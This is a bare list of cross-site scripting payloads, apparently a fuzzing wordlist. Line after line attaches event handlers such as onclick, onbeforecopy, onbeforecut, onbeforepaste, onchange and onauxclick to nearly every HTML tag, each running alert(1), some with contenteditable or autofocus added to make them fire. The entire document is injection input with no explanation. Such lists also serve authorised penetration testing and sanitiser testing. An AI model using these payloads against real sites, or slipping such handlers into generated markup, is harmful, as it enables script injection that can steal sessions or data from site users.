<input onauxclick=alert(1)>
<textarea onauxclick=alert(1)>XSS</textarea>
<option onbeforecopy="alert(1)" contenteditable>test</option>
<output onbeforecopy="alert(1)" contenteditable>test</output>
<p onbeforecopy="alert(1)" contenteditable>test</p>
<param onbeforecopy="alert(1)" contenteditable>test</param>
<picture onbeforecopy="alert(1)" contenteditable>test</picture>
<plaintext onbeforecopy="alert(1)" contenteditable>test</plaintext>
<pre onbeforecopy="alert(1)" contenteditable>test</pre>
<progress onbeforecopy="alert(1)" contenteditable>test</progress>
<q onbeforecopy="alert(1)" contenteditable>test</q>
<rb onbeforecopy="alert(1)" contenteditable>test</rb>
<rp onbeforecopy="alert(1)" contenteditable>test</rp>
<rt onbeforecopy="alert(1)" contenteditable>test</rt>
<rtc onbeforecopy="alert(1)" contenteditable>test</rtc>
<ruby onbeforecopy="alert(1)" contenteditable>test</ruby>
<s onbeforecopy="alert(1)" contenteditable>test</s>
<samp onbeforecopy="alert(1)" contenteditable>test</samp>
<script onbeforecopy="alert(1)" contenteditable>test</script>
<section onbeforecopy="alert(1)" contenteditable>test</section>
<select onbeforecopy="alert(1)" contenteditable>test</select>
<shadow onbeforecopy="alert(1)" contenteditable>test</shadow>
<slot onbeforecopy="alert(1)" contenteditable>test</slot>
<small onbeforecopy="alert(1)" contenteditable>test</small>
<source onbeforecopy="alert(1)" contenteditable>test</source>
<spacer onbeforecopy="alert(1)" contenteditable>test</spacer>
<span onbeforecopy="alert(1)" contenteditable>test</span>
<strike onbeforecopy="alert(1)" contenteditable>test</strike>
<strong onbeforecopy="alert(1)" contenteditable>test</strong>
<style onbeforecopy="alert(1)" contenteditable>test</style>
<sub onbeforecopy="alert(1)" contenteditable>test</sub>
<summary onbeforecopy="alert(1)" contenteditable>test</summary>
<sup onbeforecopy="alert(1)" contenteditable>test</sup>
<svg onbeforecopy="alert(1)" contenteditable>test</svg>
<table onbeforecopy="alert(1)" contenteditable>test</table>
<tbody onbeforecopy="alert(1)" contenteditable>test</tbody>
<td onbeforecopy="alert(1)" contenteditable>test</td>
<template onbeforecopy="alert(1)" contenteditable>test</template>
<textarea onbeforecopy=alert(1) autofocus>XSS</textarea>
<tfoot onbeforecopy="alert(1)" contenteditable>test</tfoot>
<th onbeforecopy="alert(1)" contenteditable>test</th>
<thead onbeforecopy="alert(1)" contenteditable>test</thead>
<time onbeforecopy="alert(1)" contenteditable>test</time>
<title onbeforecopy="alert(1)" contenteditable>test</title>
<tr onbeforecopy="alert(1)" contenteditable>test</tr>
<track onbeforecopy="alert(1)" contenteditable>test</track>
<tt onbeforecopy="alert(1)" contenteditable>test</tt>
<u onbeforecopy="alert(1)" contenteditable>test</u>
<ul onbeforecopy="alert(1)" contenteditable>test</ul>
<var onbeforecopy="alert(1)" contenteditable>test</var>
<video onbeforecopy="alert(1)" contenteditable>test</video>
<wbr onbeforecopy="alert(1)" contenteditable>test</wbr>
<xmp onbeforecopy="alert(1)" contenteditable>test</xmp>
<a onbeforecut="alert(1)" contenteditable>test</a>
<abbr onbeforecut="alert(1)" contenteditable>test</abbr>
<acronym onbeforecut="alert(1)" contenteditable>test</acronym>
<address onbeforecut="alert(1)" contenteditable>test</address>
<applet onbeforecut="alert(1)" contenteditable>test</applet>
<area onbeforecut="alert(1)" contenteditable>test</area>
<article onbeforecut="alert(1)" contenteditable>test</article>
<aside onbeforecut="alert(1)" contenteditable>test</aside>
<audio onbeforecut="alert(1)" contenteditable>test</audio>
<b onbeforecut="alert(1)" contenteditable>test</b>
<base onbeforecut="alert(1)" contenteditable>test</base>
<basefont onbeforecut="alert(1)" contenteditable>test</basefont>
<bdi onbeforecut="alert(1)" contenteditable>test</bdi>
<bdo onbeforecut="alert(1)" contenteditable>test</bdo>
<bgsound onbeforecut="alert(1)" contenteditable>test</bgsound>
<big onbeforecut="alert(1)" contenteditable>test</big>
<blink onbeforecut="alert(1)" contenteditable>test</blink>
<blockquote onbeforecut="alert(1)" contenteditable>test</blockquote>
<body onbeforecut="alert(1)" contenteditable>test</body>
<br onbeforecut="alert(1)" contenteditable>test</br>
<button onbeforecut="alert(1)" contenteditable>test</button>
<canvas onbeforecut="alert(1)" contenteditable>test</canvas>
<caption onbeforecut="alert(1)" contenteditable>test</caption>
<center onbeforecut="alert(1)" contenteditable>test</center>
<cite onbeforecut="alert(1)" contenteditable>test</cite>
<code onbeforecut="alert(1)" contenteditable>test</code>
<col onbeforecut="alert(1)" contenteditable>test</col>
<colgroup onbeforecut="alert(1)" contenteditable>test</colgroup>
<command onbeforecut="alert(1)" contenteditable>test</command>
<content onbeforecut="alert(1)" contenteditable>test</content>
<data onbeforecut="alert(1)" contenteditable>test</data>
<datalist onbeforecut="alert(1)" contenteditable>test</datalist>
<dd onbeforecut="alert(1)" contenteditable>test</dd>
<del onbeforecut="alert(1)" contenteditable>test</del>
<details onbeforecut="alert(1)" contenteditable>test</details>
<dfn onbeforecut="alert(1)" contenteditable>test</dfn>
<dialog onbeforecut="alert(1)" contenteditable>test</dialog>
<dir onbeforecut="alert(1)" contenteditable>test</dir>
<div onbeforecut="alert(1)" contenteditable>test</div>
<dl onbeforecut="alert(1)" contenteditable>test</dl>
<dt onbeforecut="alert(1)" contenteditable>test</dt>
<element onbeforecut="alert(1)" contenteditable>test</element>
<em onbeforecut="alert(1)" contenteditable>test</em>
<embed onbeforecut="alert(1)" contenteditable>test</embed>
<fieldset onbeforecut="alert(1)" contenteditable>test</fieldset>
<figcaption onbeforecut="alert(1)" contenteditable>test</figcaption>
<figure onbeforecut="alert(1)" contenteditable>test</figure>
<font onbeforecut="alert(1)" contenteditable>test</font>
<footer onbeforecut="alert(1)" contenteditable>test</footer>
<form onbeforecut="alert(1)" contenteditable>test</form>
<frame onbeforecut="alert(1)" contenteditable>test</frame>
<frameset onbeforecut="alert(1)" contenteditable>test</frameset>
<h1 onbeforecut="alert(1)" contenteditable>test</h1>
<head onbeforecut="alert(1)" contenteditable>test</head>
<header onbeforecut="alert(1)" contenteditable>test</header>
<hgroup onbeforecut="alert(1)" contenteditable>test</hgroup>
<hr onbeforecut="alert(1)" contenteditable>test</hr>
<html onbeforecut="alert(1)" contenteditable>test</html>
<i onbeforecut="alert(1)" contenteditable>test</i>
<iframe onbeforecut="alert(1)" contenteditable>test</iframe>
<image onbeforecut="alert(1)" contenteditable>test</image>
<img onbeforecut="alert(1)" contenteditable>test</img>
<input onbeforecut=alert(1) value="XSS" autofocus>
<ins onbeforecut="alert(1)" contenteditable>test</ins>
<isindex onbeforecut="alert(1)" contenteditable>test</isindex>
<kbd onbeforecut="alert(1)" contenteditable>test</kbd>
<keygen onbeforecut="alert(1)" contenteditable>test</keygen>
<label onbeforecut="alert(1)" contenteditable>test</label>
<legend onbeforecut="alert(1)" contenteditable>test</legend>
<li onbeforecut="alert(1)" contenteditable>test</li>
<link onbeforecut="alert(1)" contenteditable>test</link>
<listing onbeforecut="alert(1)" contenteditable>test</listing>
<main onbeforecut="alert(1)" contenteditable>test</main>
<map onbeforecut="alert(1)" contenteditable>test</map>
<mark onbeforecut="alert(1)" contenteditable>test</mark>
<marquee onbeforecut="alert(1)" contenteditable>test</marquee>
<menu onbeforecut="alert(1)" contenteditable>test</menu>
<menuitem onbeforecut="alert(1)" contenteditable>test</menuitem>
<meta onbeforecut="alert(1)" contenteditable>test</meta>
<meter onbeforecut="alert(1)" contenteditable>test</meter>
<multicol onbeforecut="alert(1)" contenteditable>test</multicol>
<nav onbeforecut="alert(1)" contenteditable>test</nav>
<nextid onbeforecut="alert(1)" contenteditable>test</nextid>
<nobr onbeforecut="alert(1)" contenteditable>test</nobr>
<noembed onbeforecut="alert(1)" contenteditable>test</noembed>
<noframes onbeforecut="alert(1)" contenteditable>test</noframes>
<noscript onbeforecut="alert(1)" contenteditable>test</noscript>
<object onbeforecut="alert(1)" contenteditable>test</object>
<ol onbeforecut="alert(1)" contenteditable>test</ol>
<optgroup onbeforecut="alert(1)" contenteditable>test</optgroup>
<option onbeforecut="alert(1)" contenteditable>test</option>
<output onbeforecut="alert(1)" contenteditable>test</output>
<p onbeforecut="alert(1)" contenteditable>test</p>
<param onbeforecut="alert(1)" contenteditable>test</param>
<picture onbeforecut="alert(1)" contenteditable>test</picture>
<plaintext onbeforecut="alert(1)" contenteditable>test</plaintext>
<pre onbeforecut="alert(1)" contenteditable>test</pre>
<progress onbeforecut="alert(1)" contenteditable>test</progress>
<q onbeforecut="alert(1)" contenteditable>test</q>
<rb onbeforecut="alert(1)" contenteditable>test</rb>
<rp onbeforecut="alert(1)" contenteditable>test</rp>
<rt onbeforecut="alert(1)" contenteditable>test</rt>
<rtc onbeforecut="alert(1)" contenteditable>test</rtc>
<ruby onbeforecut="alert(1)" contenteditable>test</ruby>
<s onbeforecut="alert(1)" contenteditable>test</s>
<samp onbeforecut="alert(1)" contenteditable>test</samp>
<script onbeforecut="alert(1)" contenteditable>test</script>
<section onbeforecut="alert(1)" contenteditable>test</section>
<select onbeforecut="alert(1)" contenteditable>test</select>
<shadow onbeforecut="alert(1)" contenteditable>test</shadow>
<slot onbeforecut="alert(1)" contenteditable>test</slot>
<small onbeforecut="alert(1)" contenteditable>test</small>
<source onbeforecut="alert(1)" contenteditable>test</source>
<spacer onbeforecut="alert(1)" contenteditable>test</spacer>
<span onbeforecut="alert(1)" contenteditable>test</span>
<strike onbeforecut="alert(1)" contenteditable>test</strike>
<strong onbeforecut="alert(1)" contenteditable>test</strong>
<style onbeforecut="alert(1)" contenteditable>test</style>
<sub onbeforecut="alert(1)" contenteditable>test</sub>
<summary onbeforecut="alert(1)" contenteditable>test</summary>
<sup onbeforecut="alert(1)" contenteditable>test</sup>
<svg onbeforecut="alert(1)" contenteditable>test</svg>
<table onbeforecut="alert(1)" contenteditable>test</table>
<tbody onbeforecut="alert(1)" contenteditable>test</tbody>
<td onbeforecut="alert(1)" contenteditable>test</td>
<template onbeforecut="alert(1)" contenteditable>test</template>
<textarea onbeforecut=alert(1) autofocus>XSS</textarea>
<tfoot onbeforecut="alert(1)" contenteditable>test</tfoot>
<th onbeforecut="alert(1)" contenteditable>test</th>
<thead onbeforecut="alert(1)" contenteditable>test</thead>
<time onbeforecut="alert(1)" contenteditable>test</time>
<title onbeforecut="alert(1)" contenteditable>test</title>
<tr onbeforecut="alert(1)" contenteditable>test</tr>
<track onbeforecut="alert(1)" contenteditable>test</track>
<tt onbeforecut="alert(1)" contenteditable>test</tt>
<u onbeforecut="alert(1)" contenteditable>test</u>
<ul onbeforecut="alert(1)" contenteditable>test</ul>
<var onbeforecut="alert(1)" contenteditable>test</var>
<video onbeforecut="alert(1)" contenteditable>test</video>
<wbr onbeforecut="alert(1)" contenteditable>test</wbr>
<xmp onbeforecut="alert(1)" contenteditable>test</xmp>
<a onbeforepaste="alert(1)" contenteditable>test</a>
<abbr onbeforepaste="alert(1)" contenteditable>test</abbr>
<acronym onbeforepaste="alert(1)" contenteditable>test</acronym>
<address onbeforepaste="alert(1)" contenteditable>test</address>
<applet onbeforepaste="alert(1)" contenteditable>test</applet>
<area onbeforepaste="alert(1)" contenteditable>test</area>
<article onbeforepaste="alert(1)" contenteditable>test</article>
<aside onbeforepaste="alert(1)" contenteditable>test</aside>
<audio onbeforepaste="alert(1)" contenteditable>test</audio>
<b onbeforepaste="alert(1)" contenteditable>test</b>
<base onbeforepaste="alert(1)" contenteditable>test</base>
<basefont onbeforepaste="alert(1)" contenteditable>test</basefont>
<bdi onbeforepaste="alert(1)" contenteditable>test</bdi>
<bdo onbeforepaste="alert(1)" contenteditable>test</bdo>
<bgsound onbeforepaste="alert(1)" contenteditable>test</bgsound>
<big onbeforepaste="alert(1)" contenteditable>test</big>
<blink onbeforepaste="alert(1)" contenteditable>test</blink>
<blockquote onbeforepaste="alert(1)" contenteditable>test</blockquote>
<body onbeforepaste="alert(1)" contenteditable>test</body>
<br onbeforepaste="alert(1)" contenteditable>test</br>
<button onbeforepaste="alert(1)" contenteditable>test</button>
<canvas onbeforepaste="alert(1)" contenteditable>test</canvas>
<caption onbeforepaste="alert(1)" contenteditable>test</caption>
<center onbeforepaste="alert(1)" contenteditable>test</center>
<cite onbeforepaste="alert(1)" contenteditable>test</cite>
<code onbeforepaste="alert(1)" contenteditable>test</code>
<col onbeforepaste="alert(1)" contenteditable>test</col>
<colgroup onbeforepaste="alert(1)" contenteditable>test</colgroup>
<command onbeforepaste="alert(1)" contenteditable>test</command>
<content onbeforepaste="alert(1)" contenteditable>test</content>
<data onbeforepaste="alert(1)" contenteditable>test</data>
<datalist onbeforepaste="alert(1)" contenteditable>test</datalist>
<dd onbeforepaste="alert(1)" contenteditable>test</dd>
<del onbeforepaste="alert(1)" contenteditable>test</del>
<details onbeforepaste="alert(1)" contenteditable>test</details>
<dfn onbeforepaste="alert(1)" contenteditable>test</dfn>
<dialog onbeforepaste="alert(1)" contenteditable>test</dialog>
<dir onbeforepaste="alert(1)" contenteditable>test</dir>
<div onbeforepaste="alert(1)" contenteditable>test</div>
<dl onbeforepaste="alert(1)" contenteditable>test</dl>
<dt onbeforepaste="alert(1)" contenteditable>test</dt>
<element onbeforepaste="alert(1)" contenteditable>test</element>
<em onbeforepaste="alert(1)" contenteditable>test</em>
<embed onbeforepaste="alert(1)" contenteditable>test</embed>
<fieldset onbeforepaste="alert(1)" contenteditable>test</fieldset>
<figcaption onbeforepaste="alert(1)" contenteditable>test</figcaption>
<figure onbeforepaste="alert(1)" contenteditable>test</figure>
<font onbeforepaste="alert(1)" contenteditable>test</font>
<footer onbeforepaste="alert(1)" contenteditable>test</footer>
<form onbeforepaste="alert(1)" contenteditable>test</form>
<frame onbeforepaste="alert(1)" contenteditable>test</frame>
<frameset onbeforepaste="alert(1)" contenteditable>test</frameset>
<h1 onbeforepaste="alert(1)" contenteditable>test</h1>
<head onbeforepaste="alert(1)" contenteditable>test</head>
<header onbeforepaste="alert(1)" contenteditable>test</header>
<hgroup onbeforepaste="alert(1)" contenteditable>test</hgroup>
<hr onbeforepaste="alert(1)" contenteditable>test</hr>
<html onbeforepaste="alert(1)" contenteditable>test</html>
<i onbeforepaste="alert(1)" contenteditable>test</i>
<iframe onbeforepaste="alert(1)" contenteditable>test</iframe>
<image onbeforepaste="alert(1)" contenteditable>test</image>
<img onbeforepaste="alert(1)" contenteditable>test</img>
<input onbeforepaste=alert(1) value="" autofocus>
<ins onbeforepaste="alert(1)" contenteditable>test</ins>
<isindex onbeforepaste="alert(1)" contenteditable>test</isindex>
<kbd onbeforepaste="alert(1)" contenteditable>test</kbd>
<keygen onbeforepaste="alert(1)" contenteditable>test</keygen>
<label onbeforepaste="alert(1)" contenteditable>test</label>
<legend onbeforepaste="alert(1)" contenteditable>test</legend>
<li onbeforepaste="alert(1)" contenteditable>test</li>
<link onbeforepaste="alert(1)" contenteditable>test</link>
<listing onbeforepaste="alert(1)" contenteditable>test</listing>
<main onbeforepaste="alert(1)" contenteditable>test</main>
<map onbeforepaste="alert(1)" contenteditable>test</map>
<mark onbeforepaste="alert(1)" contenteditable>test</mark>
<marquee onbeforepaste="alert(1)" contenteditable>test</marquee>
<menu onbeforepaste="alert(1)" contenteditable>test</menu>
<menuitem onbeforepaste="alert(1)" contenteditable>test</menuitem>
<meta onbeforepaste="alert(1)" contenteditable>test</meta>
<meter onbeforepaste="alert(1)" contenteditable>test</meter>
<multicol onbeforepaste="alert(1)" contenteditable>test</multicol>
<nav onbeforepaste="alert(1)" contenteditable>test</nav>
<nextid onbeforepaste="alert(1)" contenteditable>test</nextid>
<nobr onbeforepaste="alert(1)" contenteditable>test</nobr>
<noembed onbeforepaste="alert(1)" contenteditable>test</noembed>
<noframes onbeforepaste="alert(1)" contenteditable>test</noframes>
<noscript onbeforepaste="alert(1)" contenteditable>test</noscript>
<object onbeforepaste="alert(1)" contenteditable>test</object>
<ol onbeforepaste="alert(1)" contenteditable>test</ol>
<optgroup onbeforepaste="alert(1)" contenteditable>test</optgroup>
<option onbeforepaste="alert(1)" contenteditable>test</option>
<output onbeforepaste="alert(1)" contenteditable>test</output>
<p onbeforepaste="alert(1)" contenteditable>test</p>
<param onbeforepaste="alert(1)" contenteditable>test</param>
<picture onbeforepaste="alert(1)" contenteditable>test</picture>
<plaintext onbeforepaste="alert(1)" contenteditable>test</plaintext>
<pre onbeforepaste="alert(1)" contenteditable>test</pre>
<progress onbeforepaste="alert(1)" contenteditable>test</progress>
<q onbeforepaste="alert(1)" contenteditable>test</q>
<rb onbeforepaste="alert(1)" contenteditable>test</rb>
<rp onbeforepaste="alert(1)" contenteditable>test</rp>
<rt onbeforepaste="alert(1)" contenteditable>test</rt>
<rtc onbeforepaste="alert(1)" contenteditable>test</rtc>
<ruby onbeforepaste="alert(1)" contenteditable>test</ruby>
<s onbeforepaste="alert(1)" contenteditable>test</s>
<samp onbeforepaste="alert(1)" contenteditable>test</samp>
<script onbeforepaste="alert(1)" contenteditable>test</script>
<section onbeforepaste="alert(1)" contenteditable>test</section>
<select onbeforepaste="alert(1)" contenteditable>test</select>
<shadow onbeforepaste="alert(1)" contenteditable>test</shadow>
<slot onbeforepaste="alert(1)" contenteditable>test</slot>
<small onbeforepaste="alert(1)" contenteditable>test</small>
<source onbeforepaste="alert(1)" contenteditable>test</source>
<spacer onbeforepaste="alert(1)" contenteditable>test</spacer>
<span onbeforepaste="alert(1)" contenteditable>test</span>
<strike onbeforepaste="alert(1)" contenteditable>test</strike>
<strong onbeforepaste="alert(1)" contenteditable>test</strong>
<style onbeforepaste="alert(1)" contenteditable>test</style>
<sub onbeforepaste="alert(1)" contenteditable>test</sub>
<summary onbeforepaste="alert(1)" contenteditable>test</summary>
<sup onbeforepaste="alert(1)" contenteditable>test</sup>
<svg onbeforepaste="alert(1)" contenteditable>test</svg>
<table onbeforepaste="alert(1)" contenteditable>test</table>
<tbody onbeforepaste="alert(1)" contenteditable>test</tbody>
<td onbeforepaste="alert(1)" contenteditable>test</td>
<template onbeforepaste="alert(1)" contenteditable>test</template>
<textarea onbeforepaste=alert(1) autofocus></textarea>
<tfoot onbeforepaste="alert(1)" contenteditable>test</tfoot>
<th onbeforepaste="alert(1)" contenteditable>test</th>
<thead onbeforepaste="alert(1)" contenteditable>test</thead>
<time onbeforepaste="alert(1)" contenteditable>test</time>
<title onbeforepaste="alert(1)" contenteditable>test</title>
<tr onbeforepaste="alert(1)" contenteditable>test</tr>
<track onbeforepaste="alert(1)" contenteditable>test</track>
<tt onbeforepaste="alert(1)" contenteditable>test</tt>
<u onbeforepaste="alert(1)" contenteditable>test</u>
<ul onbeforepaste="alert(1)" contenteditable>test</ul>
<var onbeforepaste="alert(1)" contenteditable>test</var>
<video onbeforepaste="alert(1)" contenteditable>test</video>
<wbr onbeforepaste="alert(1)" contenteditable>test</wbr>
<xmp onbeforepaste="alert(1)" contenteditable>test</xmp>
<input onchange=alert(1) value=xss>
<select onchange=alert(1)><option>change me</option><option>XSS</option></select>
<textarea onchange=alert(1)>XSS</textarea>
<xss onclick="alert(1)">test</xss>
<a onclick="alert(1)">test</a>
<abbr onclick="alert(1)">test</abbr>
<acronym onclick="alert(1)">test</acronym>
<address onclick="alert(1)">test</address>
<applet onclick="alert(1)">test</applet>
<area onclick="alert(1)">test</area>
<article onclick="alert(1)">test</article>
<aside onclick="alert(1)">test</aside>
<audio onclick="alert(1)">test</audio>
<b onclick="alert(1)">test</b>
<base onclick="alert(1)">test</base>
<basefont onclick="alert(1)">test</basefont>
<bdi onclick="alert(1)">test</bdi>
<bdo onclick="alert(1)">test</bdo>
<bgsound onclick="alert(1)">test</bgsound>
<big onclick="alert(1)">test</big>
<blink onclick="alert(1)">test</blink>
<blockquote onclick="alert(1)">test</blockquote>
<body onclick="alert(1)">test</body>
<br onclick="alert(1)">test</br>
<button onclick="alert(1)">test</button>
<canvas onclick="alert(1)">test</canvas>
<caption onclick="alert(1)">test</caption>
<center onclick="alert(1)">test</center>
<cite onclick="alert(1)">test</cite>
<code onclick="alert(1)">test</code>
<col onclick="alert(1)">test</col>
<colgroup onclick="alert(1)">test</colgroup>
<command onclick="alert(1)">test</command>
<content onclick="alert(1)">test</content>
<data onclick="alert(1)">test</data>
<datalist onclick="alert(1)">test</datalist>
<dd onclick="alert(1)">test</dd>
<del onclick="alert(1)">test</del>
<details onclick="alert(1)">test</details>
<dfn onclick="alert(1)">test</dfn>
<dialog onclick="alert(1)">test</dialog>
<dir onclick="alert(1)">test</dir>
<div onclick="alert(1)">test</div>
<dl onclick="alert(1)">test</dl>
<dt onclick="alert(1)">test</dt>
<element onclick="alert(1)">test</element>
<em onclick="alert(1)">test</em>
<embed onclick="alert(1)">test</embed>
<fieldset onclick="alert(1)">test</fieldset>
<figcaption onclick="alert(1)">test</figcaption>
<figure onclick="alert(1)">test</figure>
<font onclick="alert(1)">test</font>
<footer onclick="alert(1)">test</footer>
<form onclick="alert(1)">test</form>
<frame onclick="alert(1)">test</frame>
<frameset onclick="alert(1)">test</frameset>
<h1 onclick="alert(1)">test</h1>
<head onclick="alert(1)">test</head>
<header onclick="alert(1)">test</header>
<hgroup onclick="alert(1)">test</hgroup>
<hr onclick="alert(1)">test</hr>
<html onclick="alert(1)">test</html>
<i onclick="alert(1)">test</i>
<iframe onclick="alert(1)">test</iframe>
<image onclick="alert(1)">test</image>
<img onclick="alert(1)">test</img>
<input onclick="alert(1)">test</input>
<ins onclick="alert(1)">test</ins>
<isindex onclick="alert(1)">test</isindex>
<kbd onclick="alert(1)">test</kbd>
<keygen onclick="alert(1)">test</keygen>
<label onclick="alert(1)">test</label>
<legend onclick="alert(1)">test</legend>
<li onclick="alert(1)">test</li>
<link onclick="alert(1)">test</link>
<listing onclick="alert(1)">test</listing>
<main onclick="alert(1)">test</main>
<map onclick="alert(1)">test</map>
<mark onclick="alert(1)">test</mark>
<marquee onclick="alert(1)">test</marquee>
<menu onclick="alert(1)">test</menu>
<menuitem onclick="alert(1)">test</menuitem>
<meta onclick="alert(1)">test</meta>
<meter onclick="alert(1)">test</meter>
<multicol onclick="alert(1)">test</multicol>
<nav onclick="alert(1)">test</nav>
<nextid onclick="alert(1)">test</nextid>
<nobr onclick="alert(1)">test</nobr>
<noembed onclick="alert(1)">test</noembed>
<noframes onclick="alert(1)">test</noframes>
<noscript onclick="alert(1)">test</noscript>
<object onclick="alert(1)">test</object>
<ol onclick="alert(1)">test</ol>
<optgroup onclick="alert(1)">test</optgroup>
<option onclick="alert(1)">test</option>
<output onclick="alert(1)">test</output>
<p onclick="alert(1)">test</p>
